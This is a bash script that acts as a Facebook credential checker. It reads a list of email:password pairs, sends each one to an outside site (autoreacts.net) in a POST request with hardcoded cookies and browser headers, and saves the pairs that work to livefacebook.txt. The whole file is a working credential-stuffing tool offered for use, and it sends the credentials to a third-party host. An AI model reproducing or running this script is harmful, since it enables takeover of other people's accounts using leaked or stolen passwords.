#!/bin/bash
NC='\033[0m'
GREEN='\e[38;5;82m'
CYAN='\e[38;5;45m'
RED='\e[38;5;196m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
function get_action(){
	curl -s -X POST \
--url 'http://autoreacts.net/' \
-H "Connection: keep-alive
-H Content-Length: 35
-H Origin: http://autoreacts.net
-H User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
-H DNT: 1
-H Content-type: application/x-www-form-urlencoded
-H Accept: */*
-H Accept-Encoding: gzip, deflate
-H Accept-Language: en-US,en;q=0.9,id;q=0.8
-H Cookie: __cfduid=d0dc4b3e083918b2d83924245d3c96c5c1546523091; _ga=GA1.2.1737378024.1546523101; _gid=GA1.2.688388450.1546643129; _gat_gtag_UA_131240478_1=1; email=$1" \
-d 'u='$1'&p='$2'' | jq . | grep -Po "(?<=src=\\\\\").*?(?=\\\\\">)"
}
function get_token(){
	get_link=$(get_action $1 $2)
	echo $(curl -s ''$get_link'' | grep -Po "(?<=\"error_msg\":\").*?(?=\")")
}
echo 'please put empass with delimeter ( : )'
read -p 'Your Empass : ' list
x=$(gawk -F: '{ print $1 }' $list)
y=$(gawk -F: '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($x)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'password=($y)'
for (( i = 0; i < "${#email[@]}"; i++ )); do
    user="${email[$i]}"
    pws="${password[$i]}"
printf "[$i/${#email[@]}] ${GREEN}$user${NC}-${BLUE}$pws : "
gaskeun=$(get_token $user $pws)
if [[ "$gaskeun" = '' ]]; then
	printf "${CYAN}Live!${NC}\n"
	echo "$user|$pws" >> livefacebook.txt
else 
	printf "${RED}$gaskeun${NC}\n"
fi
done
